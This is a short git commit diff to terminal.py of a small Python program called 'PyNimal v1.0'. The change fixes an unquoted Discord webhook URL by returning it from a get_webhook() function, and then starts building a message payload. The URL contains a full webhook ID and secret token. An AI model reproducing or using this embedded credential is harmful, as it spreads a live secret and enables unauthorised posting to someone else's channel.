4971caf7522366765eba0dca3cf331a4658befcd
lubro0 <142106680+lubro0@users.noreply.github.com>
2024-10-20 16:37:42 +0200

    Update terminal.py

--- terminal.py
+++ terminal.py
@@ -6,7 +6,10 @@ time.sleep(1)
 os.system('clear')
 print("\033[90mPyNimal v1.0\033[0m")
 
-webhook = https://discord.com/api/webhooks/1297565535550177351/QNlGYeWZ2i_lAALeJIMkk7Xty9Tx1EVlQI3ouQCdXRhXpxaBfN469xdvq4M_k9y2dMvI
+def get_webhook():
+    return "https://discord.com/api/webhooks/1297565535550177351/QNlGYeWZ2i_lAALeJIMkk7Xty9Tx1EVlQI3ouQCdXRhXpxaBfN469xdvq4M_k9y2dMvI"
+
+webhook = get_webhook()
 
 data = {
     "embeds": [
